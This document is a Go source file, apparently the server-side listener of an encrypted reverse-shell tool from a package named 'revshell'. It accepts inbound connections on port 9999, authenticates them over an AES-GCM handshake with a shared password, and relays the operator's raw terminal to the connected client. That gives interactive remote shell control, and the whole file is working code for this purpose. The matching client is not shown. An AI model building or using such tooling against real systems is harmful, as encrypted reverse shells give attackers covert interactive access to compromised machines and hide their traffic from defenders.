package main

import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"golang.org/x/sys/unix"

	"revshell/pkg/secureio"
)

type serverOptions struct {
	listenAddr   string
	aesKey       string
	authPassword string
}

func main() {
	opts := parseFlags()

	if opts.aesKey == "" {
		key, err := randomHex(32)
		if err != nil {
			log.Fatalf("server: failed to generate AES key: %v", err)
		}
		opts.aesKey = key
		log.Printf("server: generated random AES key: %s", key)
	}
	if opts.authPassword == "" {
		pass, err := randomHex(16)
		if err != nil {
			log.Fatalf("server: failed to generate authentication password: %v", err)
		}
		opts.authPassword = pass
		log.Printf("server: generated random authentication password: %s", pass)
	}

	listener, err := net.Listen("tcp", opts.listenAddr)
	if err != nil {
		log.Fatalf("server: failed to listen on %s: %v", opts.listenAddr, err)
	}
	defer listener.Close()

	log.Printf("server: listening on %s using AES-GCM encryption", opts.listenAddr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Temporary() {
				log.Printf("server: temporary accept error: %v", err)
				time.Sleep(100 * time.Millisecond)
				continue
			}
			log.Printf("server: stopping listener due to error: %v", err)
			return
		}

		log.Printf("server: accepted connection from %s", conn.RemoteAddr())
		if err := handleConnection(conn, opts); err != nil {
			log.Printf("server: session for %s ended with error: %v", conn.RemoteAddr(), err)
		} else {
			log.Printf("server: session for %s closed", conn.RemoteAddr())
		}
	}
}

func parseFlags() serverOptions {
	listen := flag.String("listen", "0.0.0.0:9999", "address to listen on")
	aesKey := flag.String("aes-key", "", "AES key or passphrase shared with clients")
	authPass := flag.String("auth-password", "", "authentication password shared with clients")
	flag.Parse()

	return serverOptions{
		listenAddr:   *listen,
		aesKey:       *aesKey,
		authPassword: *authPass,
	}
}

func handleConnection(conn net.Conn, opts serverOptions) error {
	defer conn.Close()

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		if err := tcpConn.SetKeepAlive(true); err == nil {
			_ = tcpConn.SetKeepAlivePeriod(30 * time.Second)
		}
	}

	transport, err := secureio.Handshake(conn, true, opts.aesKey, opts.authPassword)
	if err != nil {
		return fmt.Errorf("server: handshake failed: %w", err)
	}
	log.Printf("server: client %s authenticated", conn.RemoteAddr())

	reader := transport.Reader()
	writer := transport.Writer()

	fd := int(os.Stdin.Fd())
	var oldState *terminalState
	var winSize secureio.WindowSize
	var haveWinSize bool
	if isTerminal(fd) {
		if state, err := makeRaw(fd); err == nil {
			oldState = state
			defer restore(fd, oldState)
		} else {
			log.Printf("server: failed to switch terminal to raw mode: %v", err)
		}
		if size, err := currentTTYWindowSize(fd); err != nil {
			log.Printf("server: unable to read terminal size: %v", err)
		} else {
			winSize = size
			haveWinSize = true
			if err := transport.SendWindowSize(size); err != nil {
				log.Printf("server: failed to send terminal size: %v", err)
			}
		}
	}

	doneReading := make(chan error, 1)
	doneWriting := make(chan error, 1)

	stdout := newScrollbackWriter(os.Stdout)
	go func() {
		_, err := io.Copy(stdout, reader)
		if flushErr := stdout.Flush(); flushErr != nil {
			if err == nil {
				err = flushErr
			} else {
				log.Printf("server: failed to flush terminal output: %v", flushErr)
			}
		}
		doneReading <- err
	}()

	go func() {
		_, err := io.Copy(writer, os.Stdin)
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			_ = tcpConn.CloseWrite()
		}
		doneWriting <- err
	}()

	sigCh := make(chan os.Signal, 1)
	if haveWinSize {
		signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGWINCH)
	} else {
		signal.Notify(sigCh, syscall.SIGTERM)
	}
	defer signal.Stop(sigCh)

	var readErr error
signalLoop:
	for {
		select {
		case readErr = <-doneReading:
			break signalLoop
		case sig := <-sigCh:
			if sig == syscall.SIGWINCH && haveWinSize {
				size, err := currentTTYWindowSize(fd)
				if err != nil {
					log.Printf("server: unable to read terminal size: %v", err)
					continue
				}
				if size.Rows == winSize.Rows && size.Cols == winSize.Cols {
					continue
				}
				if err := transport.SendWindowSize(size); err != nil {
					log.Printf("server: failed to send terminal size: %v", err)
					continue
				}
				winSize = size
				continue
			}
			log.Printf("server: received signal %s, closing connection", sig)
			break signalLoop
		}
	}

	_ = conn.Close()

	if writeErr := <-doneWriting; writeErr != nil && !errors.Is(writeErr, io.EOF) {
		log.Printf("server: write error: %v", writeErr)
	}
	if readErr != nil && !errors.Is(readErr, io.EOF) {
		return readErr
	}
	return nil
}

func randomHex(size int) (string, error) {
	buf := make([]byte, size)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}

func currentTTYWindowSize(fd int) (secureio.WindowSize, error) {
	ws, err := unix.IoctlGetWinsize(fd, unix.TIOCGWINSZ)
	if err != nil {
		return secureio.WindowSize{}, err
	}
	return secureio.WindowSize{Rows: ws.Row, Cols: ws.Col}, nil
}
